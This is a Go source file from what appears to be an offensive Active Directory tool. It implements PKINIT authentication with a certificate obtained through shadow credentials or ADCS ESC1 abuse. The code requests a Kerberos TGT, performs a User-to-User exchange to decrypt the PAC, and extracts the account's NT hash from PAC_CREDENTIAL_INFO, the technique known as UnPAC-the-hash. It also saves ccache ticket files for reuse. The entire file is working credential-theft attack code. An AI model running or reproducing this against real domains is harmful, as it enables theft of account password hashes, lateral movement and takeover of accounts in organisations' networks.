package krb

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha1"
	"crypto/x509"
	stdasn1 "encoding/asn1"
	"encoding/hex"
	"fmt"
	"math/big"
	"os"
	"path/filepath"
	"time"

	"github.com/jcmturner/gofork/encoding/asn1"
	"github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/crypto"
	"github.com/jcmturner/gokrb5/v8/iana/adtype"
	"github.com/jcmturner/gokrb5/v8/iana/errorcode"
	"github.com/jcmturner/gokrb5/v8/iana/etypeID"
	"github.com/jcmturner/gokrb5/v8/iana/flags"
	"github.com/jcmturner/gokrb5/v8/iana/keyusage"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/iana/patype"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/pac"
	"github.com/jcmturner/gokrb5/v8/types"
	"software.sslmate.com/src/go-pkcs12"
)

// Windows KDC_ERR_INCONSISTENT_KEY_PURPOSE (not in RFC 4120 / gokrb5).
const kdcErrInconsistentKeyPurpose int32 = 77

const pacInfoTypeCredentials uint32 = 2

// Oakley Group 2 (RFC 2412 E.2) — Certipy / MS-PKCA DH.
var oakleyGroup2P, _ = new(big.Int).SetString(
	"FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74"+
		"020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F1437"+
		"4FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED"+
		"EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE65381FFFFFFFFFFFFFFFF",
	16,
)

var oakleyGroup2G = big.NewInt(2)

// PKINITOptions is AS-REQ with a shadow-cred / ESC1 PFX (SOCKS via SendKDC).
type PKINITOptions struct {
	Domain   string
	Username string
	KDC      string
	PFXPath  string
	PFXPass  string
	Dir      string
}

// PKINITResult is the NT hash from PAC_CREDENTIAL_INFO plus the TGT ccache.
type PKINITResult struct {
	NTHash string
	Ticket TicketMeta
}

type dhState struct {
	p, x, y *big.Int
	nonce   []byte
}

type pkAuthenticator struct {
	Cusec      int       `asn1:"explicit,tag:0"`
	CTime      time.Time `asn1:"generalized,explicit,tag:1"`
	Nonce      int       `asn1:"explicit,tag:2"`
	PAChecksum []byte    `asn1:"explicit,optional,tag:3"`
}

type authPack struct {
	PKAuthenticator   pkAuthenticator `asn1:"explicit,tag:0"`
	ClientPublicValue asn1.RawValue   `asn1:"explicit,optional,tag:1"`
	ClientDHNonce     []byte          `asn1:"explicit,optional,tag:3"`
}

type paPKASReq struct {
	SignedAuthPack []byte `asn1:"tag:0"`
}

type dhRepInfo struct {
	DHSignedData  []byte `asn1:"tag:0"`
	ServerDHNonce []byte `asn1:"explicit,optional,tag:1"`
}

type paPKASRep struct {
	DHInfo dhRepInfo `asn1:"explicit,tag:0"`
}

type kdcDHKeyInfo struct {
	SubjectPublicKey asn1.BitString `asn1:"explicit,tag:0"`
	Nonce            int            `asn1:"explicit,tag:1"`
	DHKeyExpiration  time.Time      `asn1:"generalized,explicit,optional,tag:2"`
}

type paPACRequest struct {
	IncludePAC bool `asn1:"explicit,tag:0"`
}

// PKINIT requests a TGT using the PFX and returns the NT hash from UnPAC.
func PKINIT(opts PKINITOptions) (PKINITResult, error) {
	var none PKINITResult
	if opts.Domain == "" || opts.Username == "" || opts.KDC == "" || opts.PFXPath == "" {
		return none, fmt.Errorf("--domain --user --dc --pfx required")
	}
	raw, err := os.ReadFile(opts.PFXPath)
	if err != nil {
		return none, err
	}
	key, cert, err := pkcs12.Decode(raw, opts.PFXPass)
	if err != nil {
		return none, fmt.Errorf("pfx: %w", err)
	}
	rsaKey, ok := key.(*rsa.PrivateKey)
	if !ok {
		return none, fmt.Errorf("pfx: want RSA private key")
	}
	if cert == nil {
		return none, fmt.Errorf("pfx: missing certificate")
	}

	cfg, err := NewConfig(opts.Domain, opts.KDC)
	if err != nil {
		return none, err
	}
	cfg.LibDefaults.Forwardable = true
	cfg.LibDefaults.NoAddresses = true
	user := samOnly(opts.Username)
	realm := Realm(opts.Domain)
	bootstrapOffset(opts.KDC)

	asRep, tKey, err := pkinitASExchange(opts.KDC, realm, user, cfg, rsaKey, cert)
	if err != nil {
		return none, err
	}
	if err := requireAES(asRep.DecryptedEncPart.Key.KeyType, "PKINIT TGT"); err != nil {
		return none, err
	}
	meta, err := storeASRepTicket(opts.Dir, "pkinit", asRep)
	if err != nil {
		return none, err
	}
	nt, err := unpacNTHash(opts.KDC, realm, user, cfg, asRep, tKey)
	if err != nil {
		return none, err
	}
	return PKINITResult{NTHash: nt, Ticket: meta}, nil
}

func pkinitASExchange(kdc, realm, user string, cfg *config.Config, key *rsa.PrivateKey, cert *x509.Certificate) (messages.ASRep, []byte, error) {
	var none messages.ASRep
	req, dh, err := buildPKINITASReq(realm, user, cfg, key, cert)
	if err != nil {
		return none, nil, err
	}
	rep, err := sendASReq(kdc, req)
	if err != nil {
		ke, ok := asKRBError(err, nil)
		if ok && ke.ErrorCode == errorcode.KRB_AP_ERR_SKEW {
			ApplySKEW(ke)
			req, dh, err = buildPKINITASReq(realm, user, cfg, key, cert)
			if err != nil {
				return none, nil, err
			}
			rep, err = sendASReq(kdc, req)
		}
		if err != nil {
			return none, nil, wrapPKINITKRB(err)
		}
	}
	tKey, err := pkinitReplyKey(rep, dh)
	if err != nil {
		return none, nil, err
	}
	replyKey := types.EncryptionKey{KeyType: rep.EncPart.EType, KeyValue: tKey}
	pt, err := crypto.DecryptEncPart(rep.EncPart, replyKey, keyusage.AS_REP_ENCPART)
	if err != nil {
		return none, nil, fmt.Errorf("decrypt AS-REP: %w", err)
	}
	var enc messages.EncKDCRepPart
	if err := enc.Unmarshal(pt); err != nil {
		return none, nil, fmt.Errorf("EncASRepPart: %w", err)
	}
	if enc.Nonce != req.ReqBody.Nonce {
		return none, nil, fmt.Errorf("AS nonce mismatch")
	}
	rep.DecryptedEncPart = enc
	return rep, tKey, nil
}

func buildPKINITASReq(realm, user string, cfg *config.Config, key *rsa.PrivateKey, cert *x509.Certificate) (messages.ASReq, dhState, error) {
	var none messages.ASReq
	cname := types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, user)
	req, err := messages.NewASReqForTGT(realm, cfg, cname)
	if err != nil {
		return none, dhState{}, err
	}
	now := Now()
	req.ReqBody.Till = now.Add(24 * time.Hour)
	req.ReqBody.RTime = req.ReqBody.Till
	types.SetFlag(&req.ReqBody.KDCOptions, flags.Forwardable)
	types.SetFlag(&req.ReqBody.KDCOptions, flags.Renewable)
	types.SetFlag(&req.ReqBody.KDCOptions, flags.RenewableOK)

	body, err := req.ReqBody.Marshal()
	if err != nil {
		return none, dhState{}, err
	}
	sum := sha1.Sum(body)

	dh, err := newDH()
	if err != nil {
		return none, dhState{}, err
	}
	spki, err := marshalDHSPKI(dh)
	if err != nil {
		return none, dhState{}, err
	}
	pack := authPack{
		PKAuthenticator: pkAuthenticator{
			Cusec:      int((now.UnixNano() / int64(time.Microsecond)) - (now.Unix() * 1e6)),
			CTime:      now.Truncate(time.Second),
			Nonce:      pkinitNonce(),
			PAChecksum: sum[:],
		},
		ClientPublicValue: asn1.RawValue{FullBytes: spki},
		ClientDHNonce:     dh.nonce,
	}
	authDER, err := asn1.Marshal(pack)
	if err != nil {
		return none, dhState{}, fmt.Errorf("AuthPack: %w", err)
	}
	signed, err := signAuthPack(authDER, key, cert)
	if err != nil {
		return none, dhState{}, err
	}
	pkVal, err := asn1.Marshal(paPKASReq{SignedAuthPack: signed})
	if err != nil {
		return none, dhState{}, err
	}
	pacVal, err := asn1.Marshal(paPACRequest{IncludePAC: true})
	if err != nil {
		return none, dhState{}, err
	}
	req.PAData = types.PADataSequence{
		{PADataType: patype.PA_PAC_REQUEST, PADataValue: pacVal},
		{PADataType: patype.PA_PK_AS_REQ, PADataValue: pkVal},
	}
	return req, dh, nil
}

func pkinitReplyKey(rep messages.ASRep, dh dhState) ([]byte, error) {
	info, err := parsePAPKASRep(rep.PAData)
	if err != nil {
		return nil, err
	}
	oid, content, err := cmsEContent(info.DHSignedData)
	if err != nil {
		return nil, err
	}
	if !oid.Equal(oidPKInitDHKey) {
		return nil, fmt.Errorf("pkinit: DH eContentType %v (want id-pkinit-DHKeyData)", oid)
	}
	var kdci kdcDHKeyInfo
	if _, err := asn1.Unmarshal(content, &kdci); err != nil {
		return nil, fmt.Errorf("KDCDHKeyInfo: %w", err)
	}
	peer := parseDHPublic(kdci.SubjectPublicKey)
	if peer == nil || peer.Sign() <= 0 {
		return nil, fmt.Errorf("pkinit: KDC DH public key empty")
	}
	shared := dh.exchange(peer)
	full := append(append(shared, dh.nonce...), info.ServerDHNonce...)
	switch rep.EncPart.EType {
	case etypeID.AES256_CTS_HMAC_SHA1_96:
		return truncateKey(full, 32), nil
	case etypeID.AES128_CTS_HMAC_SHA1_96:
		return truncateKey(full, 16), nil
	default:
		return nil, fmt.Errorf("pkinit: AS-REP etype=%d (want AES128/256)", rep.EncPart.EType)
	}
}

func parsePAPKASRep(pas []types.PAData) (dhRepInfo, error) {
	var raw []byte
	for _, pa := range pas {
		if pa.PADataType == patype.PA_PK_AS_REP {
			raw = pa.PADataValue
			break
		}
	}
	if len(raw) == 0 {
		return dhRepInfo{}, fmt.Errorf("pkinit: PA-PK-AS-REP missing from AS-REP")
	}
	var wrap paPKASRep
	if _, err := asn1.Unmarshal(raw, &wrap); err == nil && len(wrap.DHInfo.DHSignedData) > 0 {
		return wrap.DHInfo, nil
	}
	var info dhRepInfo
	if _, err := asn1.Unmarshal(raw, &info); err == nil && len(info.DHSignedData) > 0 {
		return info, nil
	}
	var rv asn1.RawValue
	if _, err := asn1.Unmarshal(raw, &rv); err != nil {
		return dhRepInfo{}, fmt.Errorf("PA-PK-AS-REP: %w", err)
	}
	if rv.Class == 2 && rv.Tag == 0 {
		if _, err := asn1.Unmarshal(rv.Bytes, &info); err == nil && len(info.DHSignedData) > 0 {
			return info, nil
		}
		seq := derTLV(0x30, rv.Bytes)
		if _, err := asn1.Unmarshal(seq, &info); err == nil && len(info.DHSignedData) > 0 {
			return info, nil
		}
	}
	return dhRepInfo{}, fmt.Errorf("PA-PK-AS-REP: not DHInfo")
}

func unpacNTHash(kdc, realm, user string, cfg *config.Config, asRep messages.ASRep, tKey []byte) (string, error) {
	cname := asRep.CName
	sname := types.PrincipalName{NameType: nametype.KRB_NT_PRINCIPAL, NameString: []string{user}}
	skey := asRep.DecryptedEncPart.Key
	req, err := messages.NewUser2UserTGSReq(cname, realm, cfg, asRep.Ticket, skey, sname, false, asRep.Ticket)
	if err != nil {
		return "", fmt.Errorf("U2U TGS-REQ: %w", err)
	}
	if err := restampTGSPAData(&req, asRep.Ticket, skey); err != nil {
		return "", err
	}
	rep, err := tgsExchange(kdc, req, asRep.Ticket, skey)
	if err != nil {
		return "", fmt.Errorf("U2U: %w", err)
	}
	tkt := rep.Ticket
	if err := tkt.Decrypt(skey); err != nil {
		return "", fmt.Errorf("U2U ticket: %w", err)
	}
	special := types.EncryptionKey{KeyType: etypeID.AES256_CTS_HMAC_SHA1_96, KeyValue: tKey}
	if len(tKey) == 16 {
		special.KeyType = etypeID.AES128_CTS_HMAC_SHA1_96
	}
	nt, err := ntFromPAC(tkt.DecryptedEncPart, special)
	if err != nil {
		return "", err
	}
	return nt, nil
}

func ntFromPAC(enc messages.EncTicketPart, asReplyKey types.EncryptionKey) (string, error) {
	for _, ad := range enc.AuthorizationData {
		if ad.ADType != adtype.ADIfRelevant {
			continue
		}
		var inner types.AuthorizationData
		if err := inner.Unmarshal(ad.ADData); err != nil {
			continue
		}
		for _, el := range inner {
			if el.ADType != adtype.ADWin2KPAC {
				continue
			}
			var p pac.PACType
			if err := p.Unmarshal(el.ADData); err != nil {
				return "", fmt.Errorf("PAC: %w", err)
			}
			nt, err := ntFromPACBuffers(p, asReplyKey)
			if err != nil {
				return "", err
			}
			if nt != "" {
				return nt, nil
			}
		}
	}
	return "", fmt.Errorf("pkinit: PAC_CREDENTIAL_INFO not in ticket")
}

func ntFromPACBuffers(p pac.PACType, asReplyKey types.EncryptionKey) (string, error) {
	for _, buf := range p.Buffers {
		if buf.ULType != pacInfoTypeCredentials {
			continue
		}
		end := int(buf.Offset) + int(buf.CBBufferSize)
		if int(buf.Offset) < 0 || end > len(p.Data) {
			return "", fmt.Errorf("pkinit: PAC credential buffer bounds")
		}
		chunk := p.Data[int(buf.Offset):end]
		var cred pac.CredentialsInfo
		if err := cred.Unmarshal(chunk, asReplyKey); err != nil {
			key := asReplyKey
			key.KeyType = int32(binaryU32(chunk, 4))
			if key.KeyType != 0 && key.KeyType != asReplyKey.KeyType {
				if err2 := cred.Unmarshal(chunk, key); err2 == nil {
					err = nil
				} else {
					return "", fmt.Errorf("PAC_CREDENTIAL_INFO: %w", err)
				}
			} else {
				return "", fmt.Errorf("PAC_CREDENTIAL_INFO: %w", err)
			}
		}
		for _, sc := range cred.PACCredentialData.Credentials {
			if nt, ok := ntFromNTLMBlob(sc.Credentials); ok {
				return nt, nil
			}
		}
		return "", fmt.Errorf("pkinit: NTLM supplemental cred missing NT hash")
	}
	return "", nil
}

func ntFromNTLMBlob(b []byte) (string, bool) {
	var n pac.NTLMSupplementalCred
	if err := n.Unmarshal(b); err == nil && len(n.NTPassword) == 16 {
		return hex.EncodeToString(n.NTPassword), true
	}
	// MS-PAC: Version, Flags, LmPassword[16], NtPassword[16] — always present.
	if len(b) >= 40 {
		nt := b[24:40]
		if !allZero(nt) {
			return hex.EncodeToString(nt), true
		}
	}
	return "", false
}

func newDH() (dhState, error) {
	priv := make([]byte, 32)
	if _, err := rand.Read(priv); err != nil {
		return dhState{}, err
	}
	nonce := make([]byte, 32)
	if _, err := rand.Read(nonce); err != nil {
		return dhState{}, err
	}
	x := new(big.Int).SetBytes(priv)
	y := new(big.Int).Exp(oakleyGroup2G, x, oakleyGroup2P)
	return dhState{p: oakleyGroup2P, x: x, y: y, nonce: nonce}, nil
}

func (d dhState) exchange(peer *big.Int) []byte {
	z := new(big.Int).Exp(peer, d.x, d.p)
	return z.Bytes()
}

func marshalDHSPKI(d dhState) ([]byte, error) {
	params, err := stdasn1.Marshal(struct {
		P *big.Int
		G *big.Int
		Q *big.Int
	}{d.p, oakleyGroup2G, big.NewInt(0)})
	if err != nil {
		return nil, err
	}
	oidDER, err := stdasn1.Marshal(oidDHPublicNumber)
	if err != nil {
		return nil, err
	}
	alg := derTLV(0x30, append(oidDER, params...))
	intDER, err := stdasn1.Marshal(d.y)
	if err != nil {
		return nil, err
	}
	bit, err := stdasn1.Marshal(stdasn1.BitString{Bytes: intDER, BitLength: len(intDER) * 8})
	if err != nil {
		return nil, err
	}
	return derTLV(0x30, append(alg, bit...)), nil
}

func parseDHPublic(bs asn1.BitString) *big.Int {
	b := bs.Bytes
	if len(b) == 0 {
		return nil
	}
	if b[0] == 0x02 {
		var n *big.Int
		if _, err := stdasn1.Unmarshal(b, &n); err == nil && n != nil {
			return n
		}
	}
	return new(big.Int).SetBytes(b)
}

// truncateKey is Certipy's SHA-1 KDF (single-byte counter), not RFC 4556's 4-byte counter.
func truncateKey(value []byte, keySize int) []byte {
	out := make([]byte, 0, keySize)
	for n := 0; len(out) < keySize; n++ {
		h := sha1.Sum(append([]byte{byte(n)}, value...))
		need := keySize - len(out)
		if need > len(h) {
			need = len(h)
		}
		out = append(out, h[:need]...)
	}
	return out
}

func storeASRepTicket(dir, source string, asRep messages.ASRep) (TicketMeta, error) {
	tktBytes, err := asRep.Ticket.Marshal()
	if err != nil {
		return TicketMeta{}, err
	}
	enc := asRep.DecryptedEncPart
	cc, err := WriteCCache(CCacheCred{
		ClientRealm: asRep.CRealm,
		Client:      asRep.CName.NameString,
		ServerRealm: asRep.Ticket.Realm,
		Server:      asRep.Ticket.SName.NameString,
		KeyType:     enc.Key.KeyType,
		Key:         enc.Key.KeyValue,
		AuthTime:    enc.AuthTime,
		StartTime:   enc.StartTime,
		EndTime:     enc.EndTime,
		RenewTill:   enc.RenewTill,
		Flags:       bitStringUint32(enc.Flags.Bytes),
		Ticket:      tktBytes,
	})
	if err != nil {
		return TicketMeta{}, err
	}
	if dir == "" {
		dir = DefaultTicketDir()
	}
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return TicketMeta{}, err
	}
	id, err := newTicketID()
	if err != nil {
		return TicketMeta{}, err
	}
	ccPath := filepath.Join(dir, id+".ccache")
	if err := os.WriteFile(ccPath, cc, 0o600); err != nil {
		return TicketMeta{}, err
	}
	meta := TicketMeta{
		ID:        id,
		Principal: stringsJoin(asRep.CName.NameString, "/"),
		Realm:     asRep.CRealm,
		Server:    stringsJoin(asRep.Ticket.SName.NameString, "/") + "@" + asRep.Ticket.Realm,
		EType:     enc.Key.KeyType,
		End:       enc.EndTime,
		Source:    source,
		CCache:    ccPath,
	}
	if err := writeMeta(dir, meta); err != nil {
		return TicketMeta{}, err
	}
	return meta, nil
}

func stringsJoin(parts []string, sep string) string {
	if len(parts) == 0 {
		return ""
	}
	out := parts[0]
	for _, p := range parts[1:] {
		out += sep + p
	}
	return out
}

func allZero(b []byte) bool {
	for _, c := range b {
		if c != 0 {
			return false
		}
	}
	return true
}

func binaryU32(b []byte, off int) uint32 {
	if off+4 > len(b) {
		return 0
	}
	return uint32(b[off]) | uint32(b[off+1])<<8 | uint32(b[off+2])<<16 | uint32(b[off+3])<<24
}

func pkinitNonce() int {
	n, err := rand.Int(rand.Reader, big.NewInt(1<<31))
	if err != nil {
		return int(time.Now().UnixNano() & 0x7fffffff)
	}
	return int(n.Int64())
}

func wrapPKINITKRB(err error) error {
	return wrapKRB(err)
}
